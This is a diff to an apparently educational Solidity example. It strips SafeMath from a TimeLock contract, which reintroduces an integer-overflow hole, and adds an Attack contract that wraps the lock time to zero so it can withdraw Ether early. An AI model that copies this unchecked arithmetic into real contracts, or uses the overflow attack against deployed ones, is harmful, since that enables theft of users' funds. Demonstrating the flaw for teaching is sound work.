@@ -15,20 +15,18 @@ What happened?
 Attack caused the TimeLock.lockTime to overflow and was able to withdraw
 before the 1 week waiting period.
 */
-import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 
 contract TimeLock {
-    using SafeMath for uint256;
     mapping(address => uint) public balances;
     mapping(address => uint) public lockTime;
 
     function deposit() external payable {
-        balances[msg.sender] = SafeMath.add(balances[msg.sender], msg.value);
-        lockTime[msg.sender] = SafeMath.add(block.timestamp, 1 weeks);
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
     }
 
     function increaseLockTime(uint _secondsToIncrease) public {
-        lockTime[msg.sender] = SafeMath.add(lockTime[msg.sender], _secondsToIncrease);
+        lockTime[msg.sender] += _secondsToIncrease;
     }
 
     function withdraw() public {
@@ -40,5 +38,30 @@ contract TimeLock {
 
         (bool sent, ) = msg.sender.call{value: amount}("");
         require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    TimeLock timeLock;
+
+    constructor(TimeLock _timeLock) {
+        timeLock = TimeLock(_timeLock);
+    }
+
+    fallback() external payable {}
+
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        /*
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0
+        so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
+        */
+        timeLock.increaseLockTime(
+            type(uint).max + 1 - timeLock.lockTime(address(this))
+        );
+        timeLock.withdraw();
     }
 }
